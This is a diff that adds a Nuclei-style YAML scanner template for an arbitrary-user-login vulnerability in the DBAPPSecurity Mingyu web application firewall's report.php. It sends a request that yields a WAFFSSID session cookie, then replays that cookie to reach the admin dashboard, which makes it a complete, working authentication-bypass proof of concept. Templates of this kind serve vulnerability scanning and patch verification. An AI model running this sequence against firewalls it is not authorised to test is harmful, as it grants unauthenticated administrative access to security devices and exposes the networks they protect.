@@ -1,0 +1,53 @@
+id: poc-yaml-an-heng-ming-yu-waf-report-php-anyuser-login
+info:
+  name: 安恒 明御WEB应用防火墙 report.php 任意用户登录漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: unauthorized-access
+
+flow: http(1) && http(2)
+
+http:
+  - id: step-1
+    method: GET
+    path:
+      - "{{BaseURL}}/report.m?a=rpc-timed"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "error_0x110005"
+    extractors:
+      - type: regex
+        name: waffssid
+        part: header
+        internal: true
+        group: 1
+        regex:
+          - "WAFFSSID=([0-9a-z]+);"
+
+  - id: step-2
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    headers:
+      Cookie: WAFFSSID={{waffssid}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "日志"
+          - "网络流量"
+      - type: word
+        part: body
+        words:
+          - "明御WEB应用防火墙"
+        case-insensitive: true
